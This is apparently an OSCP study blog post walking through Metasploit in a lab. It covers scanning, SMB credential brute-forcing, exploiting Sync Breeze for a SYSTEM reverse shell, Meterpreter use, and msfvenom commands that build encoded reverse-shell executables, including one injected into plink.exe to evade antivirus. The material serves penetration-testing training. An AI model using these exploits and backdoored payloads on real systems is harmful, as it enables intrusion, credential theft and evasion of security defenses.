---
layout: post
title:  "OSCP Origin Part 22"
author: haran
categories: [oscp , security , oscp_origin]
image: post_img/oscp_origin/oscp.png
beforetoc: "Metasploit Framework"
toc: true
comments: false
rating: 3.5
---

Metasploit Framework

22. Metaspolit FrameWork
22.1 Metasploit User Interfaces and Setup


 We can launch the Metasploit command-line interface with msfconsole. The -q option hides theASCII art banner and Metasploit Framework version output as shown in Listing 733:
 
 kali@kali:~$ sudo msfconsole -q

msf5 >


kali@kali:~$ sudo apt update; sudo apt install metasploit-framework

kali@kali:~$ sudo systemctl enable postgresql

kali@kali:~$ sudo systemctl start postgresql
 
 
22.1.1 Getting Familiar with MSF Syntax


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/1.jpg)

msf5 > show -h
[*] Valid parameters for the "show" command are: all, encoders, nops, exploits, payloa
ds, auxiliary, post, plugins, info, options


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/2.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/3.jpg)

msf5 > use auxiliary/scanner/portscan/tcp
msf5 auxiliary(scanner/portscan/tcp) > back
msf5 >

msf5 > use auxiliary/scanner/portscan/tcp
msf5 auxiliary(scanner/portscan/tcp) > use auxiliary/scanner/portscan/syn
msf5 auxiliary(scanner/portscan/syn) > previous
msf5 auxiliary(scanner/portscan/tcp) >

Most modules require options (show options) before they can be run. We can configure these
options with set and unset and can also set and remove global options with setg or unsetg
respectively.


msf5 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.11.0.22
RHOSTS => 10.11.0.22

msf5 auxiliary(scanner/portscan/tcp) > run
[+] 10.11.0.22: - 10.11.0.22:80 - TCP OPEN
[+] 10.11.0.22: - 10.11.0.22:135 - TCP OPEN
[+] 10.11.0.22: - 10.11.0.22:139 - TCP OPEN
[+] 10.11.0.22: - 10.11.0.22:445 - TCP OPEN
[+] 10.11.0.22: - 10.11.0.22:3389 - TCP OPEN
[+] 10.11.0.22: - 10.11.0.22:5040 - TCP OPEN
[+] 10.11.0.22: - 10.11.0.22:9121 - TCP OPEN
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed



![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/4.jpg)

22.1.2 Metasploit Database Access

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/5.jpg)

 the database has been populated with the results of the TCP scan we ran inthe previous section. 
 
 We can display these results with the services command:

msf5 auxiliary(scanner/portscan/tcp) > services
Services
========
host port proto name state info
---- ---- ----- ---- ----- ----
10.11.0.22 80 tcp open
10.11.0.22 135 tcp open
10.11.0.22 139 tcp open
10.11.0.22 445 tcp open
10.11.0.22 3389 tcp open
10.11.0.22 5040 tcp open
10.11.0.22 9121 tcp open


 The basic services command displays all results, but we can also filter by port number (-p),service name (-s), and more as shown in the help output of services -h:

msf5 > services -h

Usage: services [-h] [-u] [-a] [-r <proto>] [-p <port1,port2>] [-s <name1,name2>] [-o
<filename>] [addr1 addr2 ...]
 -a,--add Add the services instead of searching
 -d,--delete Delete the services instead of searching
 -c <col1,col2> Only show the given columns
 -h,--help Show this help information
 -s <name> Name of the service to add
 -p <port> Search for a list of ports
 -r <protocol> Protocol type of the service being added [tcp|udp]
 -u,--up Only show services which are up
 -o <file> Send output to a file in csv format
 -O <column> Order rows by specified column number
  -R,--rhosts Set RHOSTS from the results of the search
 -S,--search Search string to filter by
 -U,--update Update data for existing service
...


 In addition to a simple TCP port scanner, we can also use the db_nmap wrapper to execute Nmapinside Metasploit and save the findings to the database for ease of access. 
 
 The db_nmap commandhas identical syntax to Nmap and is shown below:

msf5 > db_nmap

[*] Usage: db_nmap [--save | [--help | -h]] [nmap options]

msf5 > db_nmap 10.11.0.22 -A -Pn

[*] Nmap: Nmap scan report for 10.11.0.22
[*] Nmap: Host is up (0.00054s latency).
[*] Nmap: Not shown: 996 closed ports
[*] Nmap: PORT STATE SERVICE VERSION
[*] Nmap: 80/tcp open http
[*] Nmap: |_http-generator: Flexense HTTP v10.0.28
[*] Nmap: |_http-title: Sync Breeze Enterprise @ client251
[*] Nmap: 135/tcp open msrpc Microsoft Windows RPC
[*] Nmap: 139/tcp open netbios-ssn Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp open microsoft-ds?
[*] Nmap: 3389/tcp open ms-wbt-server Microsoft Terminal Services


 To display all discovered hosts up to this point, we can issue the hosts command.
 
 As an additionalexample, we can also list all services running on port 445 with the services -p 445 command.

msf5 > hosts

Hosts
=====
address mac name os_name os_flavor os_sp purpose
------- --- ---- ------- --------- ----- -------
10.11.0.22 00:0c:29:ae:3e:22 Windows Longhorn device

msf5 > services -p 445
Services
========
host port proto name state info
---- ---- ----- ---- ----- ----
10.11.0.22 445 tcp microsoft-ds open ()


 To help organize content in the database, Metasploit allows us to store information in separate workspaces. 

 When specifying a workspace, we will only see database entries relevant to that workspace, which helps us easily manage data from various enumeration efforts and assignments.
 
 We can list the available workspaces with workspace, or provide the name of the workspace as anargument to change to a different workspace as shown in

msf5 > workspace
 test
* default

msf5 > workspace test
[*] Workspace: test

msf5 > 


• To add or delete a workspace, we can use -a or -d respectively, followed by the workspace name.
22.1.3 Auxiliary Modules
 	
 22.1.3 Auxiliary Modules
 
 provide functionality suchas protocol enumeration, port scanning, fuzzing, sniffing, and more.
 
 The modules all follow acommon slash-delimited hierarchical syntax (module type/os, vendor, app, or protocol/modulename), which makes it easy to explore and use the modules.
 
 Auxiliary modules are useful for manytasks, including information gathering (under the gather/ hierarchy), scanning and enumeration ofvarious services (under the scanner/ hierarchy), and so on.
 
 To list all auxiliary modules, we run the show auxiliary command. This will present a very longlist of all auxiliary modules as shown in the truncated output below.
 
 msf5 > show auxiliary
Auxiliary
=========
 Name Rank Description
 ---- ---- -----------
 ................
 scanner/smb/smb1 normal SMBv1 Protocol Detection
 scanner/smb/smb2 normal SMB 2.0 Protocol Detection
 scanner/smb/smb_enumshares normal SMB Share Enumeration
 scanner/smb/smb_enumusers normal SMB User Enumeration (SAM EnumUsers)
 scanner/smb/smb_enumusers_domain normal SMB Domain User Enumeration
 scanner/smb/smb_login normal SMB Login Check Scanner
 scanner/smb/smb_lookupsid normal SMB SID User Enumeration (LookupSid)
 scanner/smb/smb_ms17_010 normal MS17-010 SMB RCE Detection
 scanner/smb/smb_version normal SMB Version Detection
 
 
 We can use search to reduce this considerable output, filtering by app, type, platform, and more.For example, we can search for SMB auxiliary modules with 
 search type:auxiliary name:smb as shown in the following listing.
 
 msf5 > search -h
Usage: search [ options ] <keywords>
 
 After invoking a module with use, we can request more info about it as follows:
 
 msf5 > use scanner/smb/smb2
msf5 auxiliary(scanner/smb/smb2) > info
 Name: SMB 2.0 Protocol Detection
 Module: auxiliary/scanner/smb/smb2
 License: Metasploit Framework License (BSD)
 Rank: Normal
Provided by:
 hdm <x@hdm.io>
Check supported:
 Yes
Basic options:
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 RHOSTS yes The target address range or CIDR identifier
 RPORT 445 yes The target port (TCP)
 THREADS 1 yes The number of concurrent thre
 
 The module description output by info tells us that the purpose of the smb2 module is to detectwhether or not the remote machines support the SMB 2.0 protocol. The module’s Basic optionsparameters can be inspected by executing the show options command. For this particularmodule, we just need to set the IP address of our target, in this case our student Windows 10machine.
 
 Alternatively, since we have already scanned our Windows 10 machine, we could search theMetasploit database for hosts with TCP port 445 open (services -p 445) and automatically addthe results to RHOSTS (–rhosts):
 
 msf5 auxiliary(scanner/smb/smb_version) > services -p 445 --rhosts
Services
========
host port proto name state info
---- ---- ----- ---- ----- ----
10.11.0.22 445 tcp microsoft-ds open ()
RHOSTS => 10.11.0.22
msf5 auxiliary(scanner/smb/smb_version) > 

 
 With the required parameters configured, we can launch the module with run or exploit:
 
 msf5 auxiliary(scanner/smb/smb2) > run
[+] 10.11.0.22:445 - 10.11.0.22 supports SMB 2 [dialect 255.2] and has been online f
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
 
 the remote computer does indeed support SMB version 2. Toleverage this, we can use the scanner/smb/smb_login module to attempt a brute force loginagainst the machine. Loading the module and listing the options produces the following output:
 
 msf5 auxiliary(scanner/smb/smb_enumusers_domain) > use scanner/smb/smb_login
msf5 auxiliary(scanner/smb/smb_login) > options
Module options (auxiliary/scanner/smb/smb_login):
Name Current Setting Required Description
---- --------------- -------- -----------
ABORT_ON_LOCKOUT false yes Abort the run when an account lockout is
BLANK_PASSWORDS false no Try blank passwords for all users
BRUTEFORCE_SPEED 5 yes How fast to bruteforce, from 0 to 5
DB_ALL_CREDS false no Try each user/password couple stored in
DB_ALL_PASS false no Add all passwords in the current databas

 
 The output reveals that this module accepts both Required parameters (like RHOSTS) and optionalparameters (like SMBDomain).
 
 However, we notice that RHOSTS is not set, even though we set itwhile using the previous smb2 module.
 
 This is because set defines a parameter only within thescope of the running module.
 
 We can instead set a global parameter, which is available across allmodules, with setg.
 
 let’s assume that we have discovered valid domain credentialsduring our assessment. We would like to determine if these credentials can be reused on othersservers that have TCP port 445 open.
 
 To make things easier, we will try this approach on ourWindows client, beginning with an invalid password.
 
 We’ll start by supplying the valid domain name of corp.com, a valid username (Offsec), an invalidpassword (ABCDEFG123!), and the Windows 10 target’s IP address:
 
 msf5 auxiliary(scanner/smb/smb_login) > set SMBDomain corp.com
SMBDomain => corp.com
msf5 auxiliary(scanner/smb/smb_login) > set SMBUser Offsec
SMBUser => Offsec
msf5 auxiliary(scanner/smb/smb_login) > set SMBPass ABCDEFG123!
SMBPass => ABCDEFG123!
msf5 auxiliary(scanner/smb/smb_login) > setg RHOSTS 10.11.0.22
RHOSTS => 10.11.0.22
msf5 auxiliary(scanner/smb/smb_login) > set THREADS 10
THREADS => 10
msf5 auxiliary(scanner/smb/smb_login) > run
[*] 10.11.0.22:445 - 10.11.0.22:445 - Starting SMB login bruteforce
[*] 10.11.0.22:445 - 10.11.0.22:445 - This system does not accept authentication wit
[-] 10.11.0.22:445 - 10.11.0.22:445 - Failed: 'corp.com\Offsec:ABCDEFG123!',
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

 
 Since we knew that the password we supplied was invalid, the login failed as expected. Now, let’stry to supply a valid password and re-run the module.
 
 msf5 auxiliary(scanner/smb/smb_login) > set SMBPass Qwerty09!
SMBPass => Qwerty09!
msf5 auxiliary(scanner/smb/smb_login) > run
[*] 10.11.0.22:445 - 10.11.0.22:445 - Starting SMB login bruteforce
[*] 10.11.0.22:445 - 10.11.0.22:445 - This system does not accept authentication wit
[+] 10.11.0.22:445 - 10.11.0.22:445 - Success: 'corp.com\Offsec:Qwerty09!' Administr
ator
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

 
 This time, the authentication succeeded. We can retrieve information regarding successful login attempts from the database with creds.
 
 msf5 > creds
Credentials
===========
host origin service public private realm private_typ
---- ------ ------- ------ ------- ----- -----------
10.11.0.22 10.11.0.22 445/tcp (microsoft-ds) Offsec Qwerty09! corp.com Password

 
 run was successful, this method will not scale well.
 
 To test a larger user base with avariety of passwords, we could instead use the USERPASS_FILE parameter, which instructs the module to use a file containing users and passwords separated by space, with one pair per line.
 
 msf5 auxiliary(scanner/smb/smb_login) > set USERPASS_FILE /home/kali/users.txt
USERPASS_FILE => /home/kali/users.txt
msf5 auxiliary(scanner/smb/smb_login) > run
[*] 10.11.0.22:445 - 10.11.0.22:445 - Starting SMB login bruteforce
[-] 10.11.0.22:445 - 10.11.0.22:445 - Failed: '.\bob:Qwerty09!',
[-] 10.11.0.22:445 - 10.11.0.22:445 - Failed: '.\bob:password',
[-] 10.11.0.22:445 - 10.11.0.22:445 - Failed: '.\alice:Qwerty09!',
[-] 10.11.0.22:445 - 10.11.0.22:445 - Failed: '.\alice:password',

 
 Let’s try out another module. In this example, we will try to identify machines listening on TCP port3389, which indicates they might be accepting Remote Desktop Protocol (RDP) connections. To dothis, we will invoke the scanner/rdp/rdp_scanner module.
 
 msf5 auxiliary(scanner/smb/smb_login) > use scanner/rdp/rdp_scanner
msf5 auxiliary(scanner/rdp/rdp_scanner) > show options
Module options (auxiliary/scanner/rdp/rdp_scanner):
Name Current Setting Required Description
---- --------------- -------- -----------
CredSSP true yes Whether or not to request CredSSP
EarlyUser false yes Whether to support Earlier User Authorization Re
RHOSTS yes The target address range or CIDR identifier
RPORT 3389 yes The target port (TCP)
THREADS 1 yes The number of concurrent threads
TLS true yes Wheter or not request TLS security
msf5 auxiliary(scanner/rdp/rdp_scanner) > set RHOSTS 10.11.0.22
RHOSTS => 10.11.0.22
msf5 auxiliary(scanner/rdp/rdp_scanner) > run
[*] 10.11.0.22:3389 - Detected RDP on 10.11.0.22:3389
[*] 10.11.0.22:3389 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
22.1.3.1 Exercises


1. Start the postgresql service and launch msfconsole.

2. Use the SMB, HTTP, and any other interesting auxiliary modules to scan the lab systems.

3. Review the hosts’ information in the database.
22.2 Exploit Modules


22.2.1 SyncBreeze Enterprise

msf5 > search syncbreeze
Matching Modules
================
Name Disclosure Date Rank Description
---- --------------- ---- -----------
exploit/windows/fileformat/syncbreeze_xml 2017-03-29 normal Sync Breeze Enterp
rise 9.5.16 - Import Command Buffer Overflow
exploit/windows/http/syncbreeze_bof 2017-03-15 great Sync Breeze Enterp
rise GET Buffer Overflow


The output reveals two specific exploit modules. We will focus on 10.0.28 and request info aboutthat particular module:

msf5 > info exploit/windows/http/syncbreeze_bof
 Name: Sync Breeze Enterprise GET Buffer Overflow
 Module: exploit/windows/http/syncbreeze_bof
 Platform: Windows
 Arch:
Privileged: Yes
 License: Metasploit Framework License (BSD)
 Rank: Great
 Disclosed: 2017-03-15
Provided by:
 Daniel Teixeira
 Andrew Smith
 Owais Mehtab
 Milton Valencia (wetw0rk)
Available targets:
 Id Name
 -- ----
 0 Automatic
 1 Sync Breeze Enterprise v9.4.28
 2 Sync Breeze Enterprise v10.0.28
 3 Sync Breeze Enterprise v10.1.16

 To retrieve a listing of all payloads that are compatible with the currently selected exploit module,we run show payloads as shown in Listing

 To retrieve a listing of all payloads that are compatible with the currently selected exploit module,we run show payloads as shown in Listing.
 
 To retrieve a listing of all payloads that are compatible with the currently selected exploit module,we run show payloads as shown.
 
 msf5 > use exploit/windows/http/syncbreeze_bof
msf5 exploit(windows/http/syncbreeze_bof) > show payloads
Compatible Payloads
===================
Name Rank Description
---- ---- -----------
..................
windows/shell_bind_tcp normal Windows Command Shell, Bind TCP Inli
windows/shell_hidden_bind_tcp normal Windows Command Shell, Hidden Bind T
windows/shell_reverse_tcp normal Windows Command Shell, Reverse TCP I
windows/speak_pwned normal Windows Speech API - Say "You Got 

 
 we can specify a standard reverse shell payload (windows/shell_reverse_tcp) with
 set payload and list the options with show options:
 
 msf5 exploit(windows/http/syncbreeze_bof) > set payload windows/shell_reverse_tcp
payload => windows/shell/reverse_tcp
msf5 exploit(windows/http/syncbreeze_bof) > show options
Module options (exploit/windows/http/syncbreeze_bof):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 Proxies no A proxy chain of format type:host:port[,type:ho
 RHOST yes The target address
 
 
 The “Exploit target” section below the payload settings lists OS or software versions vulnerable tothis exploit. 
 
 In this exploit module, a single static return address for ourversion of SyncBreeze will work for multiple versions of Windows. In other exploits, we will oftenneed to set the target (using set target) to match the environment we are exploiting.
 
 By setting the reverse shell payload for our exploit, Metasploit automatically added some new “Payload options”, including LHOST (listen host) and LPORT (listen port), which correspond to thehost IP address and port that the reverse shell will connect to. 
 
 Note that LPORT is set to a defaultvalue of 4444, which is fine for our purposes.
 
 Let’s go ahead and set LHOST and RHOST to defineour attacking host and target host respectively.
 
 msf5 exploit(windows/http/syncbreeze_bof) > set LHOST 10.11.0.4
LHOST => 10.11.0.4
msf5 exploit(windows/http/syncbreeze_bof) > set RHOST 10.11.0.22
RHOST => 10.11.0.22
 
 After setting LHOST to our Kali IP address and RHOST to the Windows host IP address, we can use check to verify whether or not the target host and application are vulnerable. 
 
 Note that this checkwill only work if the target application exposes some sort of banner or other identifiable data.
 
 msf5 exploit(windows/http/syncbreeze_bof) > check
[*] 10.11.0.22:80 - The target appears to be vulnerable

 
 With confirmation that the target is vulnerable, all that remains now is to run the exploit using theexploit command as displayed below.
 
 msf5 exploit(windows/http/syncbreeze_bof) > exploit
[*] Started reverse TCP handler on 10.11.0.4:4444
[*] Automatically detecting target...
[*] Target is 10.0.28
[*] Sending request...
[*] Command shell session 1 opened (10.11.0.4:4444 -> 10.11.0.22:50195)
Microsoft Windows [Version 10.0.16299.248]
(c) 2017 Microsoft Corporation. All rights reserved.
C:\Windows\system32> whoami
whoami
nt authority\system

 
22.2.1.1 Exercise


1. Exploit SyncBreeze using the existing Metasploit module.
22.3 Metasploit Payloads
22.3.1 Staged vs Non-Staged Payloads

22.3.1 Staged vs Non-Staged Payloads

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/6.jpg)

windows/shell_reverse_tcp - Connect back to attacker and spawn a command shell
windows/shell/reverse_tcp - Connect back to attacker, Spawn cmd shell (staged)


 The difference between these payloads is subtle but important. 

 A non-staged payload is sent in its entirety along with the exploit. 

 In contrast, a staged payload is usually sent in two parts.

 The firstpart contains a small primary payload that causes the victim machine to connect back to the attacker, transfer a larger secondary payload containing the rest of the shellcode, and then execute it.
 
 There are several situations in which we would prefer to use staged shellcode instead of nonstaged.
 
 If the vulnerability we are exploiting does not have enough buffer space to hold a fullpayload, a staged payload might be suitable.
 
 Since the first part of a staged payload is typically smaller than a full payload, these smaller initial payloads can likely help us in space-constrained situations.
 
 In addition, we need to keep in mind that antivirus software will quite often detectembedded shellcode in an exploit.
 
 By replacing that code with a staged payload, we remove a goodchunk of the malicious part of the shellcode, which may increase our chances of success.
 
 After the initial stage is executed by the exploit, the remaining payload is retrieved and injected directly intothe victim machine’s memory.
 
 Note that in Metasploit, the “/” character is used to denote whether a payload is staged or not, so“shell_reverse_tcp” is not staged, whereas “shell/reverse_tcp” is
22.3.2 Meterpreter Payloads

22.3.2 Meterpreter Payloads


 Meterpreter  is a multi-function payload that can bedynamically extended at run-time. 
 
 this means that the Meterpreter shell provides more features and functionality than a regular command shell, offering capabilities such as file transfer,keylogging, and various other methods of interacting with the victim machine.
 
 These tools are especially useful in the post-exploitation phase.
 
 Because of Meterpreter’s flexibility and capability,it is the favorite and most commonly-used Metasploit payload.
 
 “meterpreter” keyword returns a long list of results, but narrowing the search to the payload category reveals meterpreter versions for multiple operating systems and architectures including Windows, Linux, Android, Apple iOS, FreeBSD, and Apple OS X/macOS.
 
 msf5 > search meterpreter type:payload
Matching Modules
================
# Name Description
- ---- -----------
1 payload/android/meterpreter/reverse_http Android Meterpreter, Android
2 payload/android/meterpreter/reverse_https Android Meterpreter, Android
3 payload/android/meterpreter/reverse_tcp Android Meterpreter, Android
4 payload/android/meterpreter_reverse_http Android Meterpreter Shell, R
5 payload/android/meterpreter_reverse_https Android Meterpreter Shell, R
6 payload/android/meterpreter_reverse_tcp Android Meterpreter Shell, R
7 payload/apple_ios/aarch64/meterpreter_reverse_http Apple_iOS Meterpreter, Rever
8 payload/apple_ios/aarch64/meterpreter_reverse_https Apple_iOS Meterpreter, Rever
9 payload/apple_ios/aarch64/meterpreter_reverse_tcp Apple_iOS Meterpreter, Rever
10 payload/apple_ios/armle/meterpreter_reverse_http Apple_iOS Meterpreter, Rever
...
 
 There are a multitude of Meterpreter versions based on specific programming languages (Python,PHP, Java), protocols and transports (UDP, HTTPS, IPv6, etc), and other various specifications (32-bit vs 64-bit, staged vs unstaged, etc).
 
 payload/windows/meterpreter/reverse_udp normal Reverse UDP Stager with UUID Sup
payload/windows/meterpreter/reverse_http normal Windows Reverse HTTP Stager
payload/windows/meterpreter/reverse_https normal Windows Reverse HTTPS Stager
payload/windows/meterpreter/reverse_ipv6_tcp normal Reverse TCP Stager (IPv6)
payload/windows/meterpreter/reverse_tcp normal Reverse TCP Stager

 
 We can select a specific meterpreter payload with set and configure it just as we would a standardreverse shell payload:
 
 msf5 exploit(windows/http/syncbreeze_bof) > set payload windows/meterpreter/reverse_ht
tp
payload => windows/meterpreter/reverse_http
msf5 exploit(windows/http/syncbreeze_bof) > set LHOST 10.11.0.4
LHOST => 10.11.0.4
msf5 exploit(windows/http/syncbreeze_bof) > show options
...
Payload options (windows/meterpreter/reverse_http):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, pro
 LHOST 10.11.0.4 yes The local listener hostname
 LPORT 4444 yes The local listener port
 LURI no The HTTP Path
...

 
 msf5 exploit(windows/http/syncbreeze_bof) > exploit
[*] Started HTTP reverse handler on http://10.11.0.4:4444
[*] Automatically detecting target...
[*] Target is 10.0.28
[*] Sending request...
[*] http://10.11.0.4:4444 handling request from 10.11.0.22; (UUID: ppowchzb) Staging x
[*] Meterpreter session 1 opened (10.11.0.4:4444 -> 10.11.0.22:50270)
meterpreter >
22.3.3 Experimenting with Meterpreter
meterpreter > help
Core Commands
=============
 Command Description
 ------- -----------
 ? Help menu
 background Backgrounds the current session
 bgkill Kills a background meterpreter script
 bglist Lists running background scripts
 bgrun Executes a meterpreter script as a background thread
 channel Displays information or control active channels
 close Closes a channel
 disable_unicode_encoding Disables encoding of unicode strings
 enable_unicode_encoding Enables encoding of unicode strings
 exit Terminate the meterpreter session
 get_timeouts Get the current session timeout values
 guid Get the session GUID
.....


 The best way to get to know the features of Meterpreter is to test them out. Let’s start with a few simple commands such as sysinfo and getuid:

meterpreter > sysinfo
Computer : CLIENT251
OS : Windows 10 (Build 16299).
Architecture : x86
System Language : en_US
Domain : corp
Logged On Users : 7
Meterpreter : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM


 let’s try some uploads and downloads using built-in Meterpreter commands. Take note that,due to shell escaping, we must use two “\” characters for the destination path as shown below
 
 meterpreter > upload /usr/share/windows-resources/binaries/nc.exe c:\\Users\\Offsec
[*] uploading :/usr/share/windows-resources/binaries/nc.exe -> c:\Users\Offsec
[*] uploaded :/usr/share/windows-resources/binaries/nc.exe -> c:\Users\Offsec\nc.exe
meterpreter > download c:\\Windows\\system32\\calc.exe /tmp/calc.exe
[*] Downloading: c:\Windows\system32\calc.exe -> /tmp/calc.exe
[*] Downloaded 25.50 KiB (100.0%): c:\Windows\system32\calc.exe -> /tmp/calc.exe
[*] download : c:\Windows\system32\calc.exe -> /tmp/calc.exe
meterpreter > 

 
 meterpreter includes basic file system commands such as pwd, ls, and cd to navigate thetarget filesystem.
 
 meterpreter > shell
Process 3488 created.
Channel 3 created.
C:\Windows\system32> ftp 127.0.0.1
ftp 127.0.0.1
> ftp: connect :Connection refused
^C
Terminate channel 3? [y/N] y
meterpreter > shell
Process 3504 created.
Channel 4 created.
C:\Windows\system32> exit
exit
meterpreter >

 
 shell
command, there are also built-in meterpreter commands we can use. For example, the execute
command launches an application, ps lists all running processes, and kill terminates a given
process
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/7.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/8.jpg)
 
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/9.jpg)
22.3.3.2 Exercise


22.3.3.2 Exercise

1) Take time to review and experiment with the various payloads available in Metasploit
22.3.4 Executable Payloads

22.3.4 Executable Payloads


• The Metasploit Framework payloads can also be exported into various file types and formats, suchas ASP, VBScript, Jar, War, Windows DLL and EXE, and more.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/10.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/11.jpg)



![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/12.jpg)


• let’s use the msfvenom utility to generate a raw Windows PE reverse shell executable. 
 
• We’ll use the -p flag to set the payload, set LHOST and LPORT to assign the listening host and port, -f to set the output format (exe in this case), and 
 -o to specify the output file name.
 
 kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -o
shell_reverse.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: shell_reverse.exe

kali@kali:~$ file shell_reverse.exe


shell_reverse.exe: PE32 executable (GUI) Intel 80386, for MS Windows

 
• shellcode embedded in the PE file can be encoded using any of the many MSF encoders.
 
• this helped evade antivirus, though this is no longer true with modern AV engines.
 
 
• The encoding is configured with -e to specify the encoder type and -i to set the desired number ofencoding iterations.
 
• We can use multiple encoding iterations to further obfuscate the binary, which could effectively evade rudimentary signature detection.
 
 kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e
x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 9 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai succeeded with size 378 (iteration=1)
x86/shikata_ga_nai succeeded with size 405 (iteration=2)
x86/shikata_ga_nai succeeded with size 432 (iteration=3)
x86/shikata_ga_nai succeeded with size 459 (iteration=4)
x86/shikata_ga_nai succeeded with size 486 (iteration=5)
x86/shikata_ga_nai succeeded with size 513 (iteration=6)
x86/shikata_ga_nai succeeded with size 540 (iteration=7)
x86/shikata_ga_nai succeeded with size 567 (iteration=8)
x86/shikata_ga_nai chosen with final size 567
Payload size: 567 bytes
Final size of exe file: 73802 bytes
Saved as: shell_reverse_msf_encoded.exe

 
• Another useful feature of Metasploit is the ability to inject a payload into an existing PE file.
 
 
• which may further reduce the chances of AV detection
 
• The injection is done with the -x flag, specifying the file to inject into.


kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e
x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_re
verse_msf_encoded_embedded.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 9 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai succeeded with size 378 (iteration=1)
x86/shikata_ga_nai succeeded with size 405 (iteration=2)
x86/shikata_ga_nai succeeded with size 432 (iteration=3)
x86/shikata_ga_nai succeeded with size 459 (iteration=4)
x86/shikata_ga_nai succeeded with size 486 (iteration=5)
x86/shikata_ga_nai succeeded with size 513 (iteration=6)
x86/shikata_ga_nai succeeded with size 540 (iteration=7)
x86/shikata_ga_nai succeeded with size 567 (iteration=8)
x86/shikata_ga_nai chosen with final size 567
Payload size: 567 bytes
Final size of exe file: 311296 bytes
Saved as: shell_reverse_msf_encoded_embedded.exe

• These payloads can be used as part of a client side attack, as a backdoor, or stand-alone as an easy method to get a payload from one machine to another.

• unsuspecting user executes the binary with our injected payload, it will operate normally from the user’s perspective.

•  Behind the scenes however, the injected payload will attempt to connect back to our awaiting listener.


• A little known secret is that this process can also be accomplished from within msfconsole withthe generate command. 

• For example, we can do the following to recreate the previous msfvenomexample:

msf5 > use payload/windows/shell_reverse_tcp

msf5 payload(windows/shell_reverse_tcp) > set LHOST 10.11.0.4

LHOST => 10.11.0.4

msf5 payload(windows/shell_reverse_tcp) > set LPORT 443

LPORT => 443

msf5 payload(windows/shell_reverse_tcp) > generate -f exe -e x86/shikata_ga_nai -i 9 
-x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedde
d.exe


[*] Writing 311296 bytes to shell_reverse_msf_encoded_embedded.exe...



 The Portable Executable format is a file format for executables, object code, DLLs and others used in 32-bit and 64-bit versions of Windows operating systems. 
 
 The PE format is a data structure that encapsulates the information necessary for the Windows OS loader to manage the wrapped executable code.
 
 
 The PE file format is a format designed by Microsoft alongside Windows NT 3.1. 
 
 It was intended to be the standardised format for executable and library files in that system and is still in use today.
 
 
 A PE file is a file that begins with a header containing informations about the executable or the library (for example, a signature indicating that it's an executable, sizes, dates...), followed by the actual content (the executable or the library) that can be read by the system.
 
 
 The different extensions used to recognize that file format are : .cpl, .dll, .drv, .efi, .exe, .ocx, .scr and .sys
22.3.5 Metasploit Exploit Multi Handler


22.3.5 Metasploit Exploit Multi Handler

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/13.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/14.jpg)

• such as those generated by the windows/shell_reverse_tcp payload.
 
• However, this is inelegant and may not work for more advanced Metasploit payloads.
 
• Instead, we should use the framework multi/handler module, which works for all single and multi-stage payloads.

• When using the multi/handler module, we must specify the incoming payload type.

•In the example below, we will instruct the multi/handler to expect and accept an incoming windows/meterpreter/reverse_https Meterpreter payload that will start a first stage listener on our desired port, TCP 443.

• Once the first stage payload is accepted by the multi/handler, the second stage of the payload will be fed back to the target machine.

• After setting the parameters, we will run exploit to instruct the multi/handler to listen for a connection.


msf5 > use multi/handler

msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_https
payload => windows/meterpreter/reverse_https

msf5 exploit(multi/handler) > show options

Module options (exploit/multi/handler):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
Payload options (windows/meterpreter/reverse_https):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 EXITFUNC process yes Exit technique (Accepted: '', seh, thread, pro
 LHOST yes The local listener hostname
 LPORT 8443 yes The local listener port
 LURI no The HTTP Path
Exploit target:
 Id Name
 -- ----
 0 Wildcard Target
 
